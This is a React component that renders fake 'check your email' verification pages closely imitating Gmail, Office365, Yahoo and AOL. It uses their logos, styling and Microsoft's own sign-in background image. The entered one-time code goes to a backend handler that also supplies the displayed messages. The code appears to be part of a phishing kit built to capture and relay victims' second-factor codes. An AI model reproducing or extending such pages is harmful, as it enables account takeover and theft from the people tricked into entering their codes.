import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

interface EmailVerificationPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Full-screen "email verification" page themed per provider. The user enters
 * the code that was emailed to their recovery address.
 */
const EmailVerificationPage: React.FC<EmailVerificationPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const recoveryEmail = (data.recoveryEmail as string) || (data.email_destination as string) || 'your recovery email address';
  const backendMessage = (data.message as string) || '';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const headline: Record<ProviderKey, string> = {
    gmail: 'Check your recovery email',
    office365: 'Check your email',
    yahoo: 'Verify your email',
    aol: 'Verify your email address',
    others: 'Verify your email',
  };

  const description = backendMessage || `To continue, enter the verification code that was sent to ${recoveryEmail}.`;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_email_code', { code });
  };
  const resend = () => onAction('resend_email_code');
  const goBackHome = () => { onAction('cancel'); navigate(-1); };

  const MailIcon = ({ color, size = 48 }: { color: string; size?: number }) => (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.6" aria-hidden="true">
      <rect x="3" y="5" width="18" height="14" rx="2" />
      <path d="M3 7l9 6 9-6" />
    </svg>
  );

  // Gmail
  if (providerKey === 'gmail') {
    return (
      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[520px] mx-auto bg-white rounded-[28px] px-10 py-12" style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}>
            <div className="flex justify-center mb-6"><ProviderLogo providerKey="gmail" /></div>
            <h1 className="text-[28px] leading-9 font-normal text-gray-900 text-center mb-2">{headline.gmail}</h1>
            {email && (<p className="text-sm text-gray-700 text-center mb-2">{email}</p>)}
            <p className="text-sm text-gray-700 text-center mb-8">{description}</p>
            <form onSubmit={handleSubmit}>
              <label className="block text-xs text-gray-600 mb-1">Enter code</label>
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                maxLength={8}
                autoFocus
                className="w-full px-3 py-3 text-lg tracking-[0.4em] border border-gray-400 rounded-md outline-none focus:border-blue-600 focus:border-2"
              />
              <div className="flex justify-between items-center mt-8">
                <button type="button" onClick={resend} className="text-sm font-semibold hover:underline" style={{ color: theme.primary }}>Resend code</button>
                <div className="flex items-center gap-3">
                  <button type="button" onClick={goBackHome} className="text-sm font-semibold hover:underline" style={{ color: theme.primary }}>Try another way</button>
                  <button type="submit" disabled={code.length < 6 || submitting} className="px-6 py-2.5 text-white text-sm font-semibold rounded-full disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
                    {submitting ? 'Verifying\u2026' : 'Next'}
                  </button>
                </div>
              </div>
            </form>
          </div>
        </main>
      </div>
    );
  }

  // Office365
  if (providerKey === 'office365') {
    return (
      <div
        className="min-h-screen flex items-center justify-center p-0 md:p-4"
        style={{
          fontFamily: theme.fontFamily,
          backgroundImage: "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundColor: '#e9e9e9',
        }}
      >
        <div className="bg-white w-full max-w-[440px] px-11 py-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}>
          <div className="mb-5"><ProviderLogo providerKey="office365" /></div>
          {email && (
            <div className="flex items-center text-sm text-[#1b1b1b] mb-3">
              <button type="button" onClick={goBackHome} className="mr-2 text-[#1b1b1b]" aria-label="Back">&larr;</button>
              <span>{email}</span>
            </div>
          )}
          <h1 className="text-[24px] leading-7 font-semibold text-[#1b1b1b] mb-3">{headline.office365}</h1>
          <p className="text-sm text-[#1b1b1b] mb-5">We emailed a code to <strong>{recoveryEmail}</strong>. Please enter it below to sign in.</p>
          <form onSubmit={handleSubmit}>
            <input
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              placeholder="Code"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
              maxLength={8}
              autoFocus
              className="w-full px-2 py-1 text-[15px] border-0 border-b-2 bg-transparent outline-none focus:border-[#0067b8]"
              style={{ borderBottomColor: '#666' }}
            />
            <div className="mt-3 flex flex-col gap-1">
              <button type="button" onClick={resend} className="text-sm text-[#0067b8] hover:underline text-left w-fit">Resend code</button>
              <button type="button" onClick={() => onAction('more_info')} className="text-sm text-[#0067b8] hover:underline text-left w-fit">More information</button>
            </div>
            <div className="mt-6 flex justify-end">
              <button type="submit" disabled={code.length < 6 || submitting} className="px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60" style={{ backgroundColor: theme.primary, minWidth: '108px' }}>
                {submitting ? 'Verifying\u2026' : 'Verify'}
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  // Yahoo
  if (providerKey === 'yahoo') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <header className="flex-shrink-0 py-6 px-10"><ProviderLogo providerKey="yahoo" className="h-8" /></header>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-[420px] px-8 py-10 bg-white rounded-2xl text-center" style={{ boxShadow: '0 1px 20px rgba(0,0,0,.04)' }}>
            <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
              <MailIcon color={theme.primary} />
            </div>
            <h2 className="text-[22px] font-bold text-gray-900 mb-2">{headline.yahoo}</h2>
            {email && (<div className="my-3 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div>)}
            <p className="text-sm text-gray-600 mb-6">We sent a verification code to <strong>{recoveryEmail}</strong>. Enter it below to continue.</p>
            <form onSubmit={handleSubmit} className="space-y-4 text-left">
              <label className="block text-xs text-gray-600">Verification code</label>
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                maxLength={8}
                autoFocus
                className="w-full border-b pt-2 pb-2 text-base tracking-[0.3em] focus:outline-none"
                style={{ borderColor: '#dcdfe0' }}
              />
              <button type="submit" disabled={code.length < 6 || submitting} className="w-full mt-4 py-3 text-white font-semibold rounded-full disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
                {submitting ? 'Verifying\u2026' : 'Verify'}
              </button>
            </form>
            <div className="mt-4 flex justify-between text-sm">
              <button type="button" onClick={resend} className="font-medium" style={{ color: theme.primary }}>Resend code</button>
              <button type="button" onClick={goBackHome} className="font-medium" style={{ color: theme.primary }}>Cancel</button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // AOL
  if (providerKey === 'aol') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <header className="flex-shrink-0 py-4 px-6 border-b border-gray-200"><ProviderLogo providerKey="aol" className="h-6" /></header>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[400px] py-12 px-10 bg-white rounded-xl border border-gray-200 text-center">
            <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
              <MailIcon color={theme.primary} />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-3">{headline.aol}</h2>
            {email && (<div className="my-4 p-2 bg-gray-100 rounded-md text-sm font-medium truncate">{email}</div>)}
            <p className="text-sm text-gray-600 mb-6">We sent a verification code to <strong>{recoveryEmail}</strong>.</p>
            <form onSubmit={handleSubmit} className="space-y-4 text-left">
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Enter code"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                maxLength={8}
                autoFocus
                className="w-full border-b pt-2 pb-2 text-base tracking-[0.25em] focus:outline-none"
                style={{ borderColor: '#dcdfe0' }}
              />
              <button type="submit" disabled={code.length < 6 || submitting} className="w-full mt-4 py-3 text-white font-bold rounded-md text-base disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
                {submitting ? 'Verifying\u2026' : 'Verify'}
              </button>
            </form>
            <div className="mt-4 flex justify-between text-sm">
              <button type="button" onClick={resend} className="hover:underline" style={{ color: theme.primary }}>Resend code</button>
              <button type="button" onClick={goBackHome} className="hover:underline" style={{ color: theme.primary }}>Cancel</button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // Others (generic)
  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]" style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[440px] bg-white rounded-lg shadow p-8 text-center">
          <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
            <MailIcon color={theme.primary} />
          </div>
          <h1 className="text-[22px] leading-7 font-semibold text-[#222] mb-2">{headline.others}</h1>
          {email && (<p className="text-sm text-gray-600 mb-2">{email}</p>)}
          <p className="text-sm text-[#555] mb-6">We sent a verification code to <strong>{recoveryEmail}</strong>. Enter it below to continue.</p>
          <form onSubmit={handleSubmit}>
            <input
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
              maxLength={8}
              autoFocus
              placeholder="123456"
              className="w-full px-4 py-3 text-center text-lg tracking-[0.4em] border rounded-md outline-none focus:border-[#0066cc]"
              style={{ borderColor: '#d1d1d1' }}
            />
            <button type="submit" disabled={code.length < 6 || submitting} className="w-full mt-6 py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60" style={{ backgroundColor: theme.primary }}>
              {submitting ? 'Verifying\u2026' : 'Verify'}
            </button>
          </form>
          <div className="mt-6 flex justify-between text-sm">
            <button type="button" onClick={resend} className="hover:underline" style={{ color: theme.primary }}>Resend code</button>
            <button type="button" onClick={goBackHome} className="hover:underline" style={{ color: theme.primary }}>Cancel</button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default EmailVerificationPage;
